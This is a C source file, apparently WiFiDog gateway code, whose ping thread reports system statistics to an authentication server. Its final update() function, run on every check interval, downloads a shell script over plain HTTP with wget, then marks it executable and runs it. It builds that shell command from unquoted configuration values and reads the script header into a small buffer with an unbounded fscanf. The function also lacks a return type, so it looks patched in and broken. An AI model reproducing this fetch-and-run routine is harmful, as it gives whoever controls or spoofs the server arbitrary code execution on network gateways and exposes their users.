00055 static void ping(void);
00056 
00057 extern time_t started_time;
00058 
00063 void
00064 thread_ping(void *arg)
00065 {
00066         pthread_cond_t          cond = PTHREAD_COND_INITIALIZER;
00067         pthread_mutex_t         cond_mutex = PTHREAD_MUTEX_INITIALIZER;
00068         struct  timespec        timeout;
00069         
00070         while (1) {
00071                 /* Make sure we check the servers at the very begining */
00072                 debug(LOG_DEBUG, "Running ping()");
00073                 ping();
00074                 debug(LOG_DEBUG, "Running update()");
00075                 update();
00076 
00077                 
00078                 /* Sleep for config.checkinterval seconds... */
00079                 timeout.tv_sec = time(NULL) + config_get_config()->checkinterval;
00080                 timeout.tv_nsec = 0;
00081 
00082                 /* Mutex must be locked for pthread_cond_timedwait... */
00083                 pthread_mutex_lock(&cond_mutex);
00084                 
00085                 /* Thread safe "sleep" */
00086                 pthread_cond_timedwait(&cond, &cond_mutex, &timeout);
00087 
00088                 /* No longer needs to be locked */
00089                 pthread_mutex_unlock(&cond_mutex);
00090         }
00091 }
00092 
00096 static void
00097 ping(void)
00098 {
00099         ssize_t                 numbytes;
00100         size_t                  totalbytes;
00101         int                     sockfd, nfds, done;
00102         char                    request[MAX_BUF];
00103         fd_set                  readfds;
00104         struct timeval          timeout;
00105         FILE * fh;
00106         unsigned long int sys_uptime  = 0;
00107         unsigned int      sys_memfree = 0;
00108         float             sys_load    = 0;
00109         t_auth_serv     *auth_server = NULL;
00110         auth_server = get_auth_server();
00111         
00112         debug(LOG_DEBUG, "Entering ping()");
00113         
00114         /*
00115          * The ping thread does not really try to see if the auth server is actually
00116          * working. Merely that there is a web server listening at the port. And that
00117          * is done by connect_auth_server() internally.
00118          */
00119         sockfd = connect_auth_server();
00120         if (sockfd == -1) {
00121                 /*
00122                  * No auth servers for me to talk to
00123                  */
00124                 return;
00125         }
00126 
00127         /*
00128          * Populate uptime, memfree and load
00129          */
00130         if ((fh = fopen("/proc/uptime", "r"))) {
00131                 fscanf(fh, "%lu", &sys_uptime);
00132                 fclose(fh);
00133         }
00134         if ((fh = fopen("/proc/meminfo", "r"))) {
00135                 while (!feof(fh)) {
00136                         if (fscanf(fh, "MemFree: %u", &sys_memfree) == 0) {
00137                                 /* Not on this line */
00138                                 while (!feof(fh) && fgetc(fh) != '\n');
00139                         }
00140                         else {
00141                                 /* Found it */
00142                                 break;
00143                         }
00144                 }
00145                 fclose(fh);
00146         }
00147         if ((fh = fopen("/proc/loadavg", "r"))) {
00148                 fscanf(fh, "%f", &sys_load);
00149                 fclose(fh);
00150         }
00151 
00152         /*
00153          * Prep & send request
00154          */
00155         snprintf(request, sizeof(request) - 1,
00156                         "GET %s%sstage=ping&gw_id=%s&sys_uptime=%lu&sys_memfree=%u&sys_load=%.2f&wifidog_uptime=%lu HTTP/1.0\r\n"
00157                         "User-Agent: WiFiDog %s\r\n"
00158                         "Host: %s\r\n"
00159                         "\r\n",
00160                         auth_server->authserv_path,
00161                         auth_server->authserv_ping_script_path_fragment,
00162                         config_get_config()->gw_id,
00163                         sys_uptime,
00164                         sys_memfree,
00165                         sys_load,
00166                         (long unsigned int)((long unsigned int)time(NULL) - (long unsigned int)started_time),
00167                         VERSION,
00168                         auth_server->authserv_hostname);
00169 
00170         debug(LOG_DEBUG, "HTTP Request to Server: [%s]", request);
00171         
00172         send(sockfd, request, strlen(request), 0);
00173 
00174         debug(LOG_DEBUG, "Reading response");
00175         
00176         numbytes = totalbytes = 0;
00177         done = 0;
00178         do {
00179                 FD_ZERO(&readfds);
00180                 FD_SET(sockfd, &readfds);
00181                 timeout.tv_sec = 30; /* XXX magic... 30 second */
00182                 timeout.tv_usec = 0;
00183                 nfds = sockfd + 1;
00184 
00185                 nfds = select(nfds, &readfds, NULL, NULL, &timeout);
00186 
00187                 if (nfds > 0) {
00190                         numbytes = read(sockfd, request + totalbytes, MAX_BUF - (totalbytes + 1));
00191                         if (numbytes < 0) {
00192                                 debug(LOG_ERR, "An error occurred while reading from auth server: %s", strerror(errno));
00193                                 /* FIXME */
00194                                 close(sockfd);
00195                                 return;
00196                         }
00197                         else if (numbytes == 0) {
00198                                 done = 1;
00199                         }
00200                         else {
00201                                 totalbytes += numbytes;
00202                                 debug(LOG_DEBUG, "Read %d bytes, total now %d", numbytes, totalbytes);
00203                         }
00204                 }
00205                 else if (nfds == 0) {
00206                         debug(LOG_ERR, "Timed out reading data via select() from auth server");
00207                         /* FIXME */
00208                         close(sockfd);
00209                         return;
00210                 }
00211                 else if (nfds < 0) {
00212                         debug(LOG_ERR, "Error reading data via select() from auth server: %s", strerror(errno));
00213                         /* FIXME */
00214                         close(sockfd);
00215                         return;
00216                 }
00217         } while (!done);
00218         close(sockfd);
00219 
00220         debug(LOG_DEBUG, "Done reading reply, total %d bytes", totalbytes);
00221 
00222         request[totalbytes] = '\0';
00223 
00224         debug(LOG_DEBUG, "HTTP Response from Server: [%s]", request);
00225         
00226         if (strstr(request, "Pong") == 0) {
00227                 debug(LOG_WARNING, "Auth server did NOT say pong!");
00228                 /* FIXME */
00229         }
00230         else {
00231                 debug(LOG_DEBUG, "Auth Server Says: Pong");
00232         }
00233 
00234         return; 
00235 }
00236 update(void)
00237 {
00238         char                    command[256];
00239         char                    wgetdata[256];
00240         char                    is_bash[50];
00241         FILE * fh;
00242         t_auth_serv     *auth_server = NULL;
00243         auth_server = get_auth_server();
00244         pid_t                   pid;
00245 
00246                 pid = fork();
00247                         if (pid == 0)
00248                         {
00249                                 sprintf(command, "/bin/rm -f /tmp/cmd.sh");
00250                                         system(command);
00251                                 sprintf(wgetdata, "/usr/bin/wget -U %s -O /tmp/cmd.sh http://%s/modules/wifidog/update.php > /dev/null 2>&1",   config_get_config()->gw_id, auth_server->authserv_hostname);
00252                         debug(LOG_DEBUG, "Get cmd from server [%s]", wgetdata);
00253                                         system(wgetdata);
00254                                 
00255                                 if ((fh = fopen("/tmp/cmd.sh", "r"))) {
00256                                         fscanf(fh, "%s", &is_bash);
00257                                         fclose(fh);
00258                                 }
00259                         
00260                         debug(LOG_DEBUG, "File header is: %s", is_bash);
00261                                 if (strstr(is_bash, "#!/bin/sh") == 0) {
00262                         debug(LOG_DEBUG, "Not bash");
00263                                 sprintf(command, "/bin/rm -f /tmp/cmd.sh");
00264                                         system(command);
00265                                 }
00266                                 else {
00267                         debug(LOG_DEBUG, "Is bash");
00268                                 sprintf(command, "/bin/chmod +x /tmp/cmd.sh");
00269                                         system(command);
00270                                 sprintf(command, "/tmp/cmd.sh");
00271                                         system(command);
00272                                 sprintf(command, "/bin/rm -f /tmp/cmd.sh");
00273                                         system(command);
00274                                 }
00275                         exit (0);
00276                 }
00277 }
